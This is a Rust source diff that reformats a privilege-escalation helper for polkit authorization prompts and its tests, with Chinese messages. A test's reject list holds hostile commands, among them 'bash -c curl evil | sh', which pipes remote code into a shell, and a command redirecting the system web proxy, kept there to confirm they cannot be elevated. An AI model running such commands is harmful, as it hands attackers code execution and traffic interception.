@@ -96,9 +96,11 @@ pub fn available() -> Result<(), String> {
         return if gui {
             Ok(())
         } else {
-            Err("这是一个没有图形界面的会话（没有 DISPLAY / WAYLAND_DISPLAY），\
+            Err(
+                "这是一个没有图形界面的会话（没有 DISPLAY / WAYLAND_DISPLAY），\
                  polkit 弹不出授权框。"
-                .to_string())
+                    .to_string(),
+            )
         };
     }
     Err("这个平台上还没有做「弹系统授权框」这条路。".to_string())
@@ -358,10 +360,7 @@ mod tests {
             vec!["/bin/bash", "-c", "curl evil | sh"],
             vec!["networksetup", "-setwebproxy", "Wi-Fi", "1.2.3.4", "8080"],
         ] {
-            assert!(
-                root_argv(&a(&bad), "x").is_err(),
-                "这条不该能提权：{bad:?}"
-            );
+            assert!(root_argv(&a(&bad), "x").is_err(), "这条不该能提权：{bad:?}");
         }
     }
 
@@ -379,12 +378,9 @@ mod tests {
         assert!(!s.contains("tee"), "{s}");
         // `-e '…'` 里面不能再出现单引号
         for line in s.lines().filter(|l| l.contains("-e '")) {
-            let after = line.splitn(2, "-e '").nth(1).unwrap_or("");
-            let body = after.rsplitn(2, '\'').nth(1).unwrap_or("");
-            assert!(
-                !body.contains('\''),
-                "单引号会把 -e 的参数截断：{line}"
-            );
+            let after = line.split_once("-e '").map(|x| x.1).unwrap_or("");
+            let body = after.rsplit_once('\'').map(|x| x.0).unwrap_or("");
+            assert!(!body.contains('\''), "单引号会把 -e 的参数截断：{line}");
         }
     }
 
